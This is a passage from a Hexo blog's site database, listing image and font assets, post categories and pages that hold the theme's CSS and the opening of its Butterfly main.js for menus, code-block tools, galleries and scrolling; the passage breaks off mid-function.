B2312.ttf","hash":"18e091fcc2038ee93187c8fb13c2f40cdea6ddd5","modified":1760166042433},{"_id":"public/img/草原云彩.png","hash":"3ac34a20e55fd7aeafaeb13ac6feb70d8f2079f1","modified":1760166042433},{"_id":"public/img/齐天大圣.png","hash":"8193ab553e60afc295898e40810eec3e0b23252a","modified":1760166042433},{"_id":"public/img/楪祈.png","hash":"6f5db865690193a50995e27e93b198ad66702d13","modified":1760166042433},{"_id":"public/img/治不开心药.png","hash":"599b9e2d0bad14510994426e2a749388a60daa10","modified":1760166042433},{"_id":"public/img/罗小黑.png","hash":"83ddbf97aac5520c50b6fe9ab9ed1df4a265a3c3","modified":1760166042433},{"_id":"public/img/纸嫁衣.png","hash":"900ff5f838c81f2ae63a5b423d113ef02d9f3541","modified":1760166042433},{"_id":"public/fonts/simkai.ttf","hash":"abc0518845145934820b4cc0daf1778e858a5f2a","modified":1760166042433},{"_id":"public/img/明日香.png","hash":"a7a8b5719fe79c8de5937303c026a62eb9c912cb","modified":1760166042433}],"Category":[{"name":"比赛记录","_id":"cmglxf2hy0006uomy5nowd1pm"},{"name":"学习笔记","_id":"cmglxf2i2000euomyhz7g5ioq"},{"name":"iot","_id":"cmglxf2i8000vuomyhzxockj4"},{"name":"做题笔记","_id":"cmglxf2ib0019uomyc84o583a"},{"name":"知识梳理","_id":"cmglxf2ih002auomyfg8sbxr5"}],"Data":[],"Page":[{"title":"关于","date":"2025-10-07T04:01:51.000Z","type":"about","comments":0,"top_img":false,"aside":false,"_content":"","source":"about/index.md","raw":"---\ntitle: 关于\ndate: 2025-10-07 12:01:51\ntype: \"about\"\ncomments: false\ntop_img: false\naside: false\n---","updated":"2025-10-07T06:51:32.976Z","path":"about/index.html","layout":"page","_id":"cmglxf2hn0000uomygi6k1j21","content":"","excerpt":"","more":""},{"title":"分类","date":"2022-02-23T09:56:00.000Z","aside":false,"top_img":false,"type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2022-02-23 17:56:00\naside: false\ntop_img: false\ntype: \"categories\"\n---\n","updated":"2025-08-06T05:56:05.022Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cmglxf2hv0002uomyfzblcbnc","content":"","excerpt":"","more":""},{"_content":"@font-face {\n  font-family: 'MonaspaceNeonFrozen-SemiBold';\n  font-display: swap; \n  src: url('../fonts/MonaspaceNeonFrozen-SemiBold.ttf') format('truetype');\n      \n}\n@font-face {\n  font-family: 'simkai';\n  font-display: swap; \n  src: url('../fonts/simkai.ttf') format('truetype');  \n}\n\nbody {\n    font-family: 'MonaspaceNeonFrozen-SemiBold','simkai';\n}","source":"css/fonts.css","raw":"@font-face {\n  font-family: 'MonaspaceNeonFrozen-SemiBold';\n  font-display: swap; \n  src: url('../fonts/MonaspaceNeonFrozen-SemiBold.ttf') format('truetype');\n      \n}\n@font-face {\n  font-family: 'simkai';\n  font-display: swap; \n  src: url('../fonts/simkai.ttf') format('truetype');  \n}\n\nbody {\n    font-family: 'MonaspaceNeonFrozen-SemiBold','simkai';\n}","date":"2025-10-09T11:44:50.155Z","updated":"2025-10-09T11:44:50.155Z","path":"css/fonts.css","layout":"false","title":"","comments":1,"_id":"cmglxf2hw0004uomy2r7xfxoj","content":"@font-face {\n  font-family: 'MonaspaceNeonFrozen-SemiBold';\n  font-display: swap; \n  src: url('../fonts/MonaspaceNeonFrozen-SemiBold.ttf') format('truetype');\n      \n}\n@font-face {\n  font-family: 'simkai';\n  font-display: swap; \n  src: url('../fonts/simkai.ttf') format('truetype');  \n}\n\nbody {\n    font-family: 'MonaspaceNeonFrozen-SemiBold','simkai';\n}"},{"_content":"/* 文章页背景 */\n.layout_post>#post {\n    /* 以下代表透明度为0.7 可以自行修改*/\n    background: rgba(255, 255, 255, .8);\n}\n\n/* 所有页面背景 */\n#aside_content .card-widget,\n#recent-posts>.recent-post-item,\n.layout_page>div:first-child:not(.recent-posts),\n.layout_post>#page,\n.layout_post>#post,\n.read-mode .layout_post>#post {\n    /* 以下代表透明度为0.9 */\n    background: rgba(255, 255, 255, .8);\n}\n#post-info .post-title {\n    color: #0d0d0d;\n}\n#page-header #site-title{\n    color: #0d0d0d;\n}\n:root {\n    --card-bg: rgba(255,255,255,0.8);\n    --light-grey: #1f1f1f;\n    --text-highlight-color:#1f1f1f;\n    --card-hover-box-shadow: 0 3px 8px 6px #388e3c;\n}\n\n/* 页脚透明 */\n#footer {\n    /* 以下代表透明度为0.1*/\n    background: rgba(255, 255, 255, .1);\n}\n/*dark 模式下*/\n/*-------------------------------------------------------*/\n[data-theme='dark'] {\n  --global-bg: #0d0d0d;\n  --font-color: rgba(255,255,255,0.7);\n  --hr-border: rgba(255,255,255,0.4);\n  --hr-before-color: rgba(255,255,255,0.7);\n  --search-bg: #121212;\n  --search-input-color: rgba(255,255,255,0.7);\n  --search-a-color: rgba(255,255,255,0.7);\n  --preloader-bg: #0d0d0d;\n  --preloader-color: rgba(255,255,255,0.7);\n  --tab-border-color: #2c2c2c;\n  --tab-button-bg: #2c2c2c;\n  --tab-button-color: rgba(255,255,255,0.7);\n  --tab-button-hover-bg: #383838;\n  --tab-button-active-bg: #121212;\n  --card-bg: #121212;\n  --sidebar-bg: #121212;\n  --sidebar-menu-bg: #1f1f1f;\n  --btn-hover-color: #787878;\n  --btn-color: rgba(255,255,255,0.7);\n  --btn-bg: #1f1f1f;\n  --text-bg-hover: #383838;\n  --light-grey: rgba(255,255,255,0.7);\n  --dark-grey: rgba(255,255,255,0.2);\n  --white: rgba(255,255,255,0.9);\n  --text-highlight-color: rgba(255,255,255,0.9);\n  --blockquote-color: rgba(255,255,255,0.7);\n  --blockquote-bg: #2c2c2c;\n  --reward-pop: #2c2c2c;\n  --toc-link-color: rgba(255,255,255,0.6);\n  --scrollbar-color: #525252;\n  --timeline-bg: #1f1f1f;\n  --zoom-bg: #121212;\n  --mark-bg: rgba(0,0,0,0.6);\n}\n[data-theme='dark'] #page-header #site-title{\n    color: rgba(255,255,255,0.9);\n}","source":"css/transpancy.css","raw":"/* 文章页背景 */\n.layout_post>#post {\n    /* 以下代表透明度为0.7 可以自行修改*/\n    background: rgba(255, 255, 255, .8);\n}\n\n/* 所有页面背景 */\n#aside_content .card-widget,\n#recent-posts>.recent-post-item,\n.layout_page>div:first-child:not(.recent-posts),\n.layout_post>#page,\n.layout_post>#post,\n.read-mode .layout_post>#post {\n    /* 以下代表透明度为0.9 */\n    background: rgba(255, 255, 255, .8);\n}\n#post-info .post-title {\n    color: #0d0d0d;\n}\n#page-header #site-title{\n    color: #0d0d0d;\n}\n:root {\n    --card-bg: rgba(255,255,255,0.8);\n    --light-grey: #1f1f1f;\n    --text-highlight-color:#1f1f1f;\n    --card-hover-box-shadow: 0 3px 8px 6px #388e3c;\n}\n\n/* 页脚透明 */\n#footer {\n    /* 以下代表透明度为0.1*/\n    background: rgba(255, 255, 255, .1);\n}\n/*dark 模式下*/\n/*-------------------------------------------------------*/\n[data-theme='dark'] {\n  --global-bg: #0d0d0d;\n  --font-color: rgba(255,255,255,0.7);\n  --hr-border: rgba(255,255,255,0.4);\n  --hr-before-color: rgba(255,255,255,0.7);\n  --search-bg: #121212;\n  --search-input-color: rgba(255,255,255,0.7);\n  --search-a-color: rgba(255,255,255,0.7);\n  --preloader-bg: #0d0d0d;\n  --preloader-color: rgba(255,255,255,0.7);\n  --tab-border-color: #2c2c2c;\n  --tab-button-bg: #2c2c2c;\n  --tab-button-color: rgba(255,255,255,0.7);\n  --tab-button-hover-bg: #383838;\n  --tab-button-active-bg: #121212;\n  --card-bg: #121212;\n  --sidebar-bg: #121212;\n  --sidebar-menu-bg: #1f1f1f;\n  --btn-hover-color: #787878;\n  --btn-color: rgba(255,255,255,0.7);\n  --btn-bg: #1f1f1f;\n  --text-bg-hover: #383838;\n  --light-grey: rgba(255,255,255,0.7);\n  --dark-grey: rgba(255,255,255,0.2);\n  --white: rgba(255,255,255,0.9);\n  --text-highlight-color: rgba(255,255,255,0.9);\n  --blockquote-color: rgba(255,255,255,0.7);\n  --blockquote-bg: #2c2c2c;\n  --reward-pop: #2c2c2c;\n  --toc-link-color: rgba(255,255,255,0.6);\n  --scrollbar-color: #525252;\n  --timeline-bg: #1f1f1f;\n  --zoom-bg: #121212;\n  --mark-bg: rgba(0,0,0,0.6);\n}\n[data-theme='dark'] #page-header #site-title{\n    color: rgba(255,255,255,0.9);\n}","date":"2025-10-10T12:25:55.620Z","updated":"2025-10-10T12:25:55.620Z","path":"css/transpancy.css","layout":"false","title":"","comments":1,"_id":"cmglxf2hz0008uomy5ioh71xf","content":"/* 文章页背景 */\n.layout_post>#post {\n    /* 以下代表透明度为0.7 可以自行修改*/\n    background: rgba(255, 255, 255, .8);\n}\n\n/* 所有页面背景 */\n#aside_content .card-widget,\n#recent-posts>.recent-post-item,\n.layout_page>div:first-child:not(.recent-posts),\n.layout_post>#page,\n.layout_post>#post,\n.read-mode .layout_post>#post {\n    /* 以下代表透明度为0.9 */\n    background: rgba(255, 255, 255, .8);\n}\n#post-info .post-title {\n    color: #0d0d0d;\n}\n#page-header #site-title{\n    color: #0d0d0d;\n}\n:root {\n    --card-bg: rgba(255,255,255,0.8);\n    --light-grey: #1f1f1f;\n    --text-highlight-color:#1f1f1f;\n    --card-hover-box-shadow: 0 3px 8px 6px #388e3c;\n}\n\n/* 页脚透明 */\n#footer {\n    /* 以下代表透明度为0.1*/\n    background: rgba(255, 255, 255, .1);\n}\n/*dark 模式下*/\n/*-------------------------------------------------------*/\n[data-theme='dark'] {\n  --global-bg: #0d0d0d;\n  --font-color: rgba(255,255,255,0.7);\n  --hr-border: rgba(255,255,255,0.4);\n  --hr-before-color: rgba(255,255,255,0.7);\n  --search-bg: #121212;\n  --search-input-color: rgba(255,255,255,0.7);\n  --search-a-color: rgba(255,255,255,0.7);\n  --preloader-bg: #0d0d0d;\n  --preloader-color: rgba(255,255,255,0.7);\n  --tab-border-color: #2c2c2c;\n  --tab-button-bg: #2c2c2c;\n  --tab-button-color: rgba(255,255,255,0.7);\n  --tab-button-hover-bg: #383838;\n  --tab-button-active-bg: #121212;\n  --card-bg: #121212;\n  --sidebar-bg: #121212;\n  --sidebar-menu-bg: #1f1f1f;\n  --btn-hover-color: #787878;\n  --btn-color: rgba(255,255,255,0.7);\n  --btn-bg: #1f1f1f;\n  --text-bg-hover: #383838;\n  --light-grey: rgba(255,255,255,0.7);\n  --dark-grey: rgba(255,255,255,0.2);\n  --white: rgba(255,255,255,0.9);\n  --text-highlight-color: rgba(255,255,255,0.9);\n  --blockquote-color: rgba(255,255,255,0.7);\n  --blockquote-bg: #2c2c2c;\n  --reward-pop: #2c2c2c;\n  --toc-link-color: rgba(255,255,255,0.6);\n  --scrollbar-color: #525252;\n  --timeline-bg: #1f1f1f;\n  --zoom-bg: #121212;\n  --mark-bg: rgba(0,0,0,0.6);\n}\n[data-theme='dark'] #page-header #site-title{\n    color: rgba(255,255,255,0.9);\n}"},{"_content":"#page-header {\n  background: transparent !important;\n}\n#page-header.post-bg,\n#page-header.not-home-page {\n  height: 280px !important;\n}\n#page-header #post-info {\n  bottom: 40px !important;\n  text-align: center;\n}\n#page-header #page-site-info {\n  top: 140px !important;\n}\n@media screen and (max-width: 768px) {\n  #page-header.not-home-page {\n    height: 200px !important;\n  }\n  #page-header #post-info {\n    bottom: 10px !important;\n  }\n  #page-header #page-site-info {\n    top: 100px !important;\n  }\n}\n.top-img {\n  height: 250px;\n  margin: -50px -40px 50px;\n  border-top-left-radius: inherit;\n  border-top-right-radius: inherit;\n  background-position: center;\n  background-size: cover;\n  -webkit-transition: all 0.3s;\n  -moz-transition: all 0.3s;\n  -o-transition: all 0.3s;\n  -ms-transition: all 0.3s;\n  transition: all 0.3s;\n}\n@media screen and (max-width: 768px) {\n  .top-img {\n    height: 230px;\n    margin: -36px -14px 36px;\n  }\n}\n[data-theme='dark'] .top-img {\n  filter: brightness(0.8);\n}\n#footer:before {\n  background-color: rgba(255,255,255,0.5);\n}\n[data-theme='dark'] #footer:before {\n  background-color: rgba(0,0,0,0.5);\n}\n#footer-wrap,\n#footer-wrap a {\n  color: #111;\n  -webkit-transition: unset;\n  -moz-transition: unset;\n  -o-transition: unset;\n  -ms-transition: unset;\n  transition: unset;\n}\n[data-theme='dark'] #footer-wrap,\n[data-theme='dark'] #footer-wrap a {\n  color: var(--light-grey);\n}\n","source":"css/modify.css","raw":"#page-header {\n  background: transparent !important;\n}\n#page-header.post-bg,\n#page-header.not-home-page {\n  height: 280px !important;\n}\n#page-header #post-info {\n  bottom: 40px !important;\n  text-align: center;\n}\n#page-header #page-site-info {\n  top: 140px !important;\n}\n@media screen and (max-width: 768px) {\n  #page-header.not-home-page {\n    height: 200px !important;\n  }\n  #page-header #post-info {\n    bottom: 10px !important;\n  }\n  #page-header #page-site-info {\n    top: 100px !important;\n  }\n}\n.top-img {\n  height: 250px;\n  margin: -50px -40px 50px;\n  border-top-left-radius: inherit;\n  border-top-right-radius: inherit;\n  background-position: center;\n  background-size: cover;\n  -webkit-transition: all 0.3s;\n  -moz-transition: all 0.3s;\n  -o-transition: all 0.3s;\n  -ms-transition: all 0.3s;\n  transition: all 0.3s;\n}\n@media screen and (max-width: 768px) {\n  .top-img {\n    height: 230px;\n    margin: -36px -14px 36px;\n  }\n}\n[data-theme='dark'] .top-img {\n  filter: brightness(0.8);\n}\n#footer:before {\n  background-color: rgba(255,255,255,0.5);\n}\n[data-theme='dark'] #footer:before {\n  background-color: rgba(0,0,0,0.5);\n}\n#footer-wrap,\n#footer-wrap a {\n  color: #111;\n  -webkit-transition: unset;\n  -moz-transition: unset;\n  -o-transition: unset;\n  -ms-transition: unset;\n  transition: unset;\n}\n[data-theme='dark'] #footer-wrap,\n[data-theme='dark'] #footer-wrap a {\n  color: var(--light-grey);\n}\n","date":"2025-10-09T09:53:12.773Z","updated":"2025-10-07T06:26:10.354Z","path":"css/modify.css","layout":"false","title":"","comments":1,"_id":"cmglxf2i0000auomyhfmqa0gu","content":"#page-header {\n  background: transparent !important;\n}\n#page-header.post-bg,\n#page-header.not-home-page {\n  height: 280px !important;\n}\n#page-header #post-info {\n  bottom: 40px !important;\n  text-align: center;\n}\n#page-header #page-site-info {\n  top: 140px !important;\n}\n@media screen and (max-width: 768px) {\n  #page-header.not-home-page {\n    height: 200px !important;\n  }\n  #page-header #post-info {\n    bottom: 10px !important;\n  }\n  #page-header #page-site-info {\n    top: 100px !important;\n  }\n}\n.top-img {\n  height: 250px;\n  margin: -50px -40px 50px;\n  border-top-left-radius: inherit;\n  border-top-right-radius: inherit;\n  background-position: center;\n  background-size: cover;\n  -webkit-transition: all 0.3s;\n  -moz-transition: all 0.3s;\n  -o-transition: all 0.3s;\n  -ms-transition: all 0.3s;\n  transition: all 0.3s;\n}\n@media screen and (max-width: 768px) {\n  .top-img {\n    height: 230px;\n    margin: -36px -14px 36px;\n  }\n}\n[data-theme='dark'] .top-img {\n  filter: brightness(0.8);\n}\n#footer:before {\n  background-color: rgba(255,255,255,0.5);\n}\n[data-theme='dark'] #footer:before {\n  background-color: rgba(0,0,0,0.5);\n}\n#footer-wrap,\n#footer-wrap a {\n  color: #111;\n  -webkit-transition: unset;\n  -moz-transition: unset;\n  -o-transition: unset;\n  -ms-transition: unset;\n  transition: unset;\n}\n[data-theme='dark'] #footer-wrap,\n[data-theme='dark'] #footer-wrap a {\n  color: var(--light-grey);\n}\n"},{"_content":"document.addEventListener('DOMContentLoaded', () => {\n  let headerContentWidth, $nav\n  let mobileSidebarOpen = false\n\n  const adjustMenu = init => {\n    const getAllWidth = ele => Array.from(ele).reduce((width, i) => width + i.offsetWidth, 0)\n\n    if (init) {\n      const blogInfoWidth = getAllWidth(document.querySelector('#blog-info > a').children)\n      const menusWidth = getAllWidth(document.getElementById('menus').children)\n      headerContentWidth = blogInfoWidth + menusWidth\n      $nav = document.getElementById('nav')\n    }\n\n    const hideMenuIndex = window.innerWidth <= 768 || headerContentWidth > $nav.offsetWidth - 120\n    $nav.classList.toggle('hide-menu', hideMenuIndex)\n  }\n\n  // 初始化header\n  const initAdjust = () => {\n    adjustMenu(true)\n    $nav.classList.add('show')\n  }\n\n  // sidebar menus\n  const sidebarFn = {\n    open: () => {\n      btf.overflowPaddingR.add()\n      btf.animateIn(document.getElementById('menu-mask'), 'to_show 0.5s')\n      document.getElementById('sidebar-menus').classList.add('open')\n      mobileSidebarOpen = true\n    },\n    close: () => {\n      btf.overflowPaddingR.remove()\n      btf.animateOut(document.getElementById('menu-mask'), 'to_hide 0.5s')\n      document.getElementById('sidebar-menus').classList.remove('open')\n      mobileSidebarOpen = false\n    }\n  }\n\n  /**\n   * 首頁top_img底下的箭頭\n   */\n  const scrollDownInIndex = () => {\n    const handleScrollToDest = () => {\n      btf.scrollToDest(document.getElementById('content-inner').offsetTop, 300)\n    }\n\n    const $scrollDownEle = document.getElementById('scroll-down')\n    $scrollDownEle && btf.addEventListenerPjax($scrollDownEle, 'click', handleScrollToDest)\n  }\n\n  /**\n   * 代碼\n   * 只適用於Hexo默認的代碼渲染\n   */\n  const addHighlightTool = () => {\n    const highLight = GLOBAL_CONFIG.highlight\n    if (!highLight) return\n\n    const { highlightCopy, highlightLang, highlightHeightLimit, highlightFullpage, highlightMacStyle, plugin } = highLight\n    const isHighlightShrink = GLOBAL_CONFIG_SITE.isHighlightShrink\n    const isShowTool = highlightCopy || highlightLang || isHighlightShrink !== undefined || highlightFullpage || highlightMacStyle\n    const $figureHighlight = plugin === 'highlight.js' ? document.querySelectorAll('figure.highlight') : document.querySelectorAll('pre[class*=\"language-\"]')\n\n    if (!((isShowTool || highlightHeightLimit) && $figureHighlight.length)) return\n\n    const isPrismjs = plugin === 'prismjs'\n    const highlightShrinkClass = isHighlightShrink === true ? 'closed' : ''\n    const highlightShrinkEle = isHighlightShrink !== undefined ? '<i class=\"fas fa-angle-down expand\"></i>' : ''\n    const highlightCopyEle = highlightCopy ? '<div class=\"copy-notice\"></div><i class=\"fas fa-paste copy-button\"></i>' : ''\n    const highlightMacStyleEle = '<div class=\"macStyle\"><div class=\"mac-close\"></div><div class=\"mac-minimize\"></div><div class=\"mac-maximize\"></div></div>'\n    const highlightFullpageEle = highlightFullpage ? '<i class=\"fa-solid fa-up-right-and-down-left-from-center fullpage-button\"></i>' : ''\n\n    const alertInfo = (ele, text) => {\n      if (GLOBAL_CONFIG.Snackbar !== undefined) {\n        btf.snackbarShow(text)\n      } else {\n        ele.textContent = text\n        ele.style.opacity = 1\n        setTimeout(() => { ele.style.opacity = 0 }, 800)\n      }\n    }\n\n    const copy = async (text, ctx) => {\n      try {\n        await navigator.clipboard.writeText(text)\n        alertInfo(ctx, GLOBAL_CONFIG.copy.success)\n      } catch (err) {\n        console.error('Failed to copy: ', err)\n        alertInfo(ctx, GLOBAL_CONFIG.copy.noSupport)\n      }\n    }\n\n    // click events\n    const highlightCopyFn = (ele, clickEle) => {\n      const $buttonParent = ele.parentNode\n      $buttonParent.classList.add('copy-true')\n      const preCodeSelector = isPrismjs ? 'pre code' : 'table .code pre'\n      const codeElement = $buttonParent.querySelector(preCodeSelector)\n      if (!codeElement) return\n      copy(codeElement.innerText, clickEle.previousElementSibling)\n      $buttonParent.classList.remove('copy-true')\n    }\n\n    const highlightShrinkFn = ele => ele.classList.toggle('closed')\n\n    const codeFullpage = (item, clickEle) => {\n      const wrapEle = item.closest('figure.highlight')\n      const isFullpage = wrapEle.classList.toggle('code-fullpage')\n\n      document.body.style.overflow = isFullpage ? 'hidden' : ''\n      clickEle.classList.toggle('fa-down-left-and-up-right-to-center', isFullpage)\n      clickEle.classList.toggle('fa-up-right-and-down-left-from-center', !isFullpage)\n    }\n\n    const highlightToolsFn = e => {\n      const $target = e.target.classList\n      const currentElement = e.currentTarget\n      if ($target.contains('expand')) highlightShrinkFn(currentElement)\n      else if ($target.contains('copy-button')) highlightCopyFn(currentElement, e.target)\n      else if ($target.contains('fullpage-button')) codeFullpage(currentElement, e.target)\n    }\n\n    const expandCode = e => e.currentTarget.classList.toggle('expand-done')\n\n    // 獲取隱藏狀態下元素的真實高度\n    const getActualHeight = item => {\n      const hiddenElements = new Map()\n\n      const fix = () => {\n        let current = item\n        while (current !== document.body && current != null) {\n          if (window.getComputedStyle(current).display === 'none') {\n            hiddenElements.set(current, current.getAttribute('style') || '')\n          }\n          current = current.parentNode\n        }\n\n        const style = 'visibility: hidden !important; display: block !important;'\n        hiddenElements.forEach((originalStyle, elem) => {\n          elem.setAttribute('style', originalStyle ? originalStyle + ';' + style : style)\n        })\n      }\n\n      const restore = () => {\n        hiddenElements.forEach((originalStyle, elem) => {\n          if (originalStyle === '') elem.removeAttribute('style')\n          else elem.setAttribute('style', originalStyle)\n        })\n      }\n\n      fix()\n      const height = item.offsetHeight\n      restore()\n      return height\n    }\n\n    const createEle = (lang, item) => {\n      const fragment = document.createDocumentFragment()\n\n      if (isShowTool) {\n        const hlTools = document.createElement('div')\n        hlTools.className = `highlight-tools ${highlightShrinkClass}`\n        hlTools.innerHTML = highlightMacStyleEle + highlightShrinkEle + lang + highlightCopyEle + highlightFullpageEle\n        btf.addEventListenerPjax(hlTools, 'click', highlightToolsFn)\n        fragment.appendChild(hlTools)\n      }\n\n      if (highlightHeightLimit && getActualHeight(item) > highlightHeightLimit + 30) {\n        const ele = document.createElement('div')\n        ele.className = 'code-expand-btn'\n        ele.innerHTML = '<i class=\"fas fa-angle-double-down\"></i>'\n        btf.addEventListenerPjax(ele, 'click', expandCode)\n        fragment.appendChild(ele)\n      }\n\n      isPrismjs ? item.parentNode.insertBefore(fragment, item) : item.insertBefore(fragment, item.firstChild)\n    }\n\n    $figureHighlight.forEach(item => {\n      let langName = ''\n      if (isPrismjs) btf.wrap(item, 'figure', { class: 'highlight' })\n\n      if (!highlightLang) {\n        createEle('', item)\n        return\n      }\n\n      if (isPrismjs) {\n        langName = item.getAttribute('data-language') || 'Code'\n      } else {\n        langName = item.getAttribute('class').split(' ')[1]\n        if (langName === 'plain' || langName === undefined) langName = 'Code'\n      }\n      createEle(`<div class=\"code-lang\">${langName}</div>`, item)\n    })\n  }\n\n  /**\n   * PhotoFigcaption\n   */\n  const addPhotoFigcaption = () => {\n    if (!GLOBAL_CONFIG.isPhotoFigcaption) return\n    document.querySelectorAll('#article-container img').forEach(item => {\n      const altValue = item.title || item.alt\n      if (!altValue) return\n      const ele = document.createElement('div')\n      ele.className = 'img-alt text-center'\n      ele.textContent = altValue\n      item.insertAdjacentElement('afterend', ele)\n    })\n  }\n\n  /**\n   * Lightbox\n   */\n  const runLightbox = () => {\n    btf.loadLightbox(document.querySelectorAll('#article-container img:not(.no-lightbox)'))\n  }\n\n  /**\n   * justified-gallery 圖庫排版\n   */\n\n  const fetchUrl = async url => {\n    try {\n      const response = await fetch(url)\n      return await response.json()\n    } catch (error) {\n      console.error('Failed to fetch URL:', error)\n      return []\n    }\n  }\n\n  const runJustifiedGallery = (container, data, config) => {\n    const { isButton, limit, firstLimit, tabs } = config\n\n    const dataLength = data.length\n    const maxGroupKey = Math.ceil((dataLength - firstLimit) / limit + 1)\n\n    // Gallery configuration\n    const igConfig = {\n      gap: 5,\n      isConstantSize: true,\n      sizeRange: [150, 600],\n      // useResizeObserver: true,\n      // observeChildren: true,\n      useTransform: true\n      // useRecycle: false\n    }\n\n    const ig = new InfiniteGrid.JustifiedInfiniteGrid(container, igConfig)\n    let isLayoutHidden = false\n\n    // Utility functions\n    const sanitizeString = str => (str && str.replace(/\"/g, '&quot;')) || ''\n\n    const createImageItem = item => {\n      const alt = item.alt ? `alt=\"${sanitizeString(item.alt)}\"` : ''\n      const title = item.title ? `title=\"${sanitizeString(item.title)}\"` : ''\n      return `<div class=\"item\">\n        <img src=\"${item.url}\" data-grid-maintained-target=\"true\" ${alt} ${title} />\n      </div>`\n    }\n\n    const getItems = (nextGroupKey, count, isFirst = false) => {\n      const startIndex = isFirst ? (nextGroupKey - 1) * count : (nextGroupKey - 2) * count + firstLimit\n      return data.slice(startIndex, startIndex + count).map(createImageItem)\n    }\n\n    // Load more button\n    const addLoadMoreButton = container => {\n      const button = document.createElement('button')\n      button.innerHTML = `${GLOBAL_CONFIG.infinitegrid.buttonText}<i class=\"fa-solid fa-arrow-down\"></i>`\n\n      button.addEventListener('click', () => {\n        button.remove()\n        btf.setLoading.add(container)\n        appendItems(ig.getGroups().length + 1, limit)\n      }, { once: true })\n\n      container.insertAdjacentElement('afterend', button)\n    }\n\n    const appendItems = (nextGroupKey, count, isFirst) => {\n      ig.append(getItems(nextGroupKey, count, isFirst), nextGroupKey)\n    }\n\n    // Event handlers\n    const handleRenderComplete = e => {\n      if (tabs) {\n        const parentNode = container.parentNode\n        if (isLayoutHidden) {\n          parentNode.style.visibility = 'visible'\n        }\n        if (container.offsetHeight === 0) {\n          parentNode.style.visibility = 'hidden'\n          isLayoutHidden = true\n        }\n      }\n\n      const { updated, isResize, mounted } = e\n      if (!updated.length || !mounted.length || isResize) return\n\n      btf.loadLightbox(container.querySelectorAll('img:not(.medium-zoom-image)'))\n\n      if (ig.getGroups().length === maxGroupKey) {\n        btf.setLoading.remove(container)\n        !tabs && ig.off('renderComplete', handleRenderComplete)\n        return\n      }\n\n      if (isButton) {\n        btf.setLoading.remove(container)\n        addLoadMoreButton(container)\n      }\n    }\n\n    const handleRequestAppend = btf.debounce(e => {\n      const nextGroupKey = (+e.groupKey || 0) + 1\n\n      if (nextGroupKey === 1) appendItems(nextGroupKey, firstLimit, true)\n      else appendItems(nextGroupKey, limit)\n\n      if (nextGroupKey === maxGroupKey) ig.off('requestAppend', handleRequestAppend)\n    }, 300)\n\n    btf.setLoading.add(container)\n    ig.on('renderComplete', handleRenderComplete)\n\n    if (isButton) {\n      appendItems(1, firstLimit, true)\n    } else {\n      ig.on('requestAppend', handleRequestAppend)\n      ig.renderItems()\n    }\n\n    btf.addGlobalFn('pjaxSendOnce', () => ig.destroy())\n  }\n\n  const addJustifiedGallery = async (elements, tabs = false) => {\n    if (!elements.length) return\n\n    const initGallery = async () => {\n      for (const element of elements) {\n        if (btf.isHidden(element) || element.classList.contains('loaded')) continue\n\n        const config = {\n          isButton: element.getAttribute('data-button') === 'true',\n          limit: parseInt(element.getAttribute('data-limit'), 10),\n          firstLimit: parseInt(element.getAttribute('data-first'), 10),\n          tabs\n        }\n\n        const container = element.firstElementChild\n        const content = container.textContent\n        container.textContent = ''\n        element.classList.add('loaded')\n\n        try {\n          const data = element.getAttribute('data-type') === 'url' ? await fetchUrl(content) : JSON.parse(content)\n          runJustifiedGallery(container, data, config)\n        } catch (error) {\n          console.error('Gallery data parsing failed:', error)\n        }\n      }\n    }\n\n    if (typeof InfiniteGrid === 'function') {\n      await initGallery()\n    } else {\n      await btf.getScript(GLOBAL_CONFIG.infinitegrid.js)\n      await initGallery()\n    }\n  }\n\n  /**\n   * rightside scroll percent\n   */\n  const rightsideScrollPercent = currentTop => {\n    const scrollPercent = btf.getScrollPercent(currentTop, document.body)\n    const goUpElement = document.getElementById('go-up')\n\n    if (scrollPercent < 95) {\n      goUpElement.classList.add('show-percent')\n      goUpElement.querySelector('.scroll-percent').textContent = scrollPercent\n    } else {\n      goUpElement.classList.remove('show-percent')\n    }\n  }\n\n  /**\n   * 滾動處理\n   */\n  const scrollFn = () => {\n    const $rightside = document.getElementById('rightside')\n    const innerHeight = window.innerHeight + 56\n    let initTop = 0\n    const $header = document.getElementById('page-header')\n    const isChatBtn = typeof chatBtn !== 'undefined'\n    const isShowPercent = GLOBAL_CONFIG.percent.rightside\n\n    // 檢查文檔高度是否小於視窗高度\n    const checkDocumentHeight = () => {\n      if (document.body.scrollHeight <= innerHeight) {\n        $rightside.classList.add('rightside-show')\n        return true\n      }\n      return false\n    }\n\n    // 如果文檔高度小於視窗高度,直接返回\n    if (checkDocumentHeight()) return\n\n    // find the scroll direction\n    const scrollDirection = currentTop => {\n      const result = currentTop > initTop // true is down & false is up\n      initTop = currentTop\n      return result\n    }\n\n    let flag = ''\n    const scrollTask = btf.throttle(() => {\n      const currentTop = window.scrollY || document.documentElement.scrollTop\n      const isDown = scrollDirection(currentTop)\n      if (currentTop > 56) {\n        if (flag === '') {\n          $header.classList.add('nav-fixed')\n          $rightside.classList.add('rightside-show')\n        }\n\n        if (isDown) {\n          if (flag !== 'down') {\n            $header.classList.remove('nav-visible')\n            isChatBtn && window.chatBtn.hide()\n            flag = 'down'\n          }\n        } else {\n          if (flag !== 'up') {\n            $header.classList.add('nav-visible')\n            isChatBtn && window.chatBtn.show()\n            flag = 'up'\n          }\n        }\n      } else {\n        flag = ''\n        if (currentTop === 0) {\n          $header.classList.remove('nav-fixed', 'nav-visible')\n        }\n        $rightside.classList.remove('rightside-show')\n      }\n\n      isShowPercent && rightsideScrollPercent(currentTop)\n      checkDocumentHeight()\n    }, 300)\n\n    btf.addEventListenerPjax(window, 'scroll', scrollTask, { passive: true })\n  }\n\n  /**\n  * toc,anchor\n  */\n  const scrollFnToDo = () => {\n    const isToc = GLOBAL_CONFIG_SITE.isToc\n    const isAnchor = GLOBAL_CONFIG.isAnchor\n    const $article = document.getElementById('article-container')\n\n    if (!($article && (isToc || isAnchor))) return\n\n    let $tocLink, $cardToc, autoScrollToc, $tocPercentage, isExpand\n\n    if (isToc) {\n      const $cardTocLayout = document.getElementById('card-toc')\n      $cardToc = $cardTocLayout.querySelector('.toc-content')\n      $tocLink = $cardToc.querySelectorAll('.toc-link')\n      $tocPercentage = $cardTocLayout.querySelector('.toc-percentage')\n      isExpand = $cardToc.classList.contains('is-expand')\n\n      // toc元素點擊\n      const tocItemClickFn = e => {\n        const target = e.target.closest('.toc-link')\n        if (!target) return\n\n        